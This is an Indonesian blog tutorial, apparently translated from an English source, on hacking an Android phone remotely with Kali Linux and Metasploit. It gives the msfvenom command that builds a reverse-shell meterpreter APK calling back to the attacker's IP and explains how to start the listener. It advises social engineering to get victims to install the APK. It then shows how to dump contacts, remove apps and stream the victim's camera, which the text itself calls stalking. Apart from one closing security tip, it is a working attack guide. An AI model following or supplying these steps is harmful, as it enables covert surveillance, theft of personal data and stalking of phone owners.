---
image: '/images/hack-android.jpg'
title: 'Hack ponsel Android dari jarak jauh'
date: '2021-10-12'
---

Kita akan menggunakan msfvenom untuk membuat payload dan<!--more--> menyimpannya sebagai file apk. Setelah menghasilkan payload, kita perlu menyiapkan listener ke framework Metasploit. Setelah target mengunduh dan menginstal apk jahat, penyerang dapat dengan mudah mendapatkan kembali sesi meterpreter di Metasploit. Penyerang perlu melakukan beberapa rekayasa sosial untuk menginstal apk di perangkat seluler korban.

## Tutorial langkah demi langkah

    
### Menghasilkan Payload dengan msfvenom

Pertama, jalankan Kali Linux sehingga kita dapat menghasilkan file apk sebagai aplikasi berbahaya. Kita perlu memeriksa IP publik kita yang ternyata '192.168.0.112'. Kamu juga dapat meretas perangkat Android melalui Internet dengan menggunakan IP Publik/Eksternal kamu di LHOST dan dengan port forwarding.

![kali](/images/kali.png)

Setelah mendapatkan IP host publik Anda, gunakan alat msfvenom yang akan menghasilkan payload untuk menembus perangkat Android. Ketik perintah:
<pre>
# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R > ehacking.apk
</pre>
## Dimana:
- <b>-p</b> menunjukkan jenis payload.
- <b>android/meterpreter/reverse_tcp</b> menentukan shell meterpreter terbalik akan datang dari perangkat Android target.
- <b>LHOST</b> adalah <b>IP Publik</b> Kamu.
- <b>LPORT</b> diatur sebagai listening port.
- <b>R> /var/www/html</b> akan memberikan output langsung di server Apache.
- <b>apk</b> adalah nama akhir dari hasil akhir.

Ini akan memakan waktu untuk menghasilkan file apk hampir sepuluh ribu byte.

![kali-linix](/images/kali2.png)

<br />

# Meluncurkan Serangan

![kali-linux](/images/kali3.png)

Semua tampaknya sudah siap, sekarang jalankan <b>msfconsole</b>. Gunakan <b>exploit multi/handler</b>, atur <b>payload</b> sama seperti yang dihasilkan sebelumnya, atur nilai <b>LHOST</b> dan <p>LPORT</p> sama seperti yang digunakan dalam payload dan terakhir ketik <b>exploit</b> untuk meluncurkan serangan.
![kali-linux](/images/kali4.png)


Dalam skenario kehidupan nyata, beberapa teknik rekayasa sosial dapat digunakan untuk membiarkan target mengunduh file apk berbahaya. Untuk demonstrasi kita hanya tinggal mengakses mesin penyerang untuk mengunduh file di perangkat Android.
![kali-linux](/images/kali5.jpg)

Setelah berhasil mengunduhnya, pilih aplikasi yang akan diinstal.

Sejauh ini, opsi penginstallan sering terlihat ketika kita mencoba menginstal beberapa aplikasi pihak ketiga dan biasanya pengguna tidak akan ragu untuk mengizinkan instalasi dari sumber yang tidak dikenal.
![kali-linux](/images/kali6.jpg)

Setelah pengguna menginstal aplikasi dan menjalankannya, sesi <b>meterepreter</b> akan segera dibuka di sisi penyerang.
![kali-linux](/images/kali7.png)

<br />
    {% include iklan-artikel.html %}
# Post Exploitation

Ketik <b>"background"</b> dan kemudian <b>"sessions"</b> untuk membuat daftar semua sesi dari mana Anda dapat melihat semua IP yang terhubung ke mesin.
![kali-linux](/images/kali8.png)


Kamu dapat berinteraksi dengan sesi apa pun dengan mengetik <b>sessions -i [session ID]</b>
Setelah memasuki sesi, ketik <b>"help"</b> untuk membuat daftar semua perintah yang dapat kita ajukan di sesi ini.


Kamu dapat melihat beberapa perintah sistem file yang berguna saat Anda mencoba mencari beberapa informasi atau data sensitif. Dengan menggunakan ini, Kamu dapat dengan mudah mengunduh atau mengunggah file atau informasi apa pun
![kali-linux](/images/kali9.png)

Kamu juga akan menemukan beberapa perintah jaringan termasuk portfwd dan route
![kali-linux](/images/kali10.png)

Beberapa perintah sistem yang kuat untuk mendapatkan ID pengguna, mendapatkan shell atau mendapatkan informasi sistem yang lengkap.

Ketik "app_list" dan itu akan menampilkan semua aplikasi yang diinstal pada perangkat.
![kali-linux](/images/kali11.png)

Kita juga memiliki kekuatan untuk mencopot pemasangan aplikasi apa pun dari perangkat Android.
![kali-linux](/images/kali12.png)


# Mengekstrak Kontak dari Perangkat Android

Sekarang kita ekstrak beberapa kontak dari perangkat target dengan mengetik "dump" dan tab ganda
![kali-linux](/images/kali13.png)

Ini akan menampilkan semua opsi untuk mengekstrak dari perangkat. Ketik "dump_contacts" dan enter
![kali-linux](/images/kali14.png)

Ini akan mengekstrak semua kontak dari perangkat Android dan akan menyimpannya di direktori lokal kita. Untuk melihat file ini ketik “ls” dan “cat [file_name]”
![kali-linux](/images/kali15.png)

Ini akan menunjukkan konten file kontak yang sebelumnya diunduh dari perangkat target. Informasi ini sangat sensitif dan dapat dimanfaatkan oleh peretas.

# Mengendalikan Kamera Android

Dengan mengetik perintah <b>"webcam_stream"</b> kamu bisa menyusup dan mengamati melalui kamera android si korban, dan menguntitnya.
![kali-linux](/images/kali16.webp)

# Waspada... Android Terbaru pun Masih Lancar Terkena Serangan.

Handphone xiaomi MI10 dengan OS Android 10 Masih Lancar terkena serangan, Untuk kamu yang masih sering klik website tidak jelas yang masuk ke sms atau via whatsapp sebaiknya berhati-hati dari sanalah aplikasi ini terinstall diam-diam di android kamu.
![kali-linux](/images/kali17.webp)

![kali-linux](/images/kali18.webp)


Ada masih banyak lagi perintah yang tersedia di <b>meterpreter</b>. Lebih lanjut coba jelajahi dan pelajari apa yang bisa kita lakukan dengan perangkat Android. Ini menyimpulkan bahwa kita telah berhasil menembus perangkat Android menggunakan Kali Linux dan Metasploit-Framework.


Tip sehat untuk mengamankan perangkat Android kamu adalah dengan <b>tidak menginstal aplikasi apa pun dari sumber yang tidak dikenal</b>, bahkan jika Anda benar-benar ingin menginstalnya, cobalah untuk membaca dan memeriksa kode sumbernya untuk mengetahui apakah file ini berbahaya atau tidak.



<small>Artikel ini awalnya diterbitkan di [blog ehacking.](https://www.ehacking.net/2020/04/how-to-hack-an-android-phone-using-metasploit-msfvenom-in-kali-linux.html)</small>
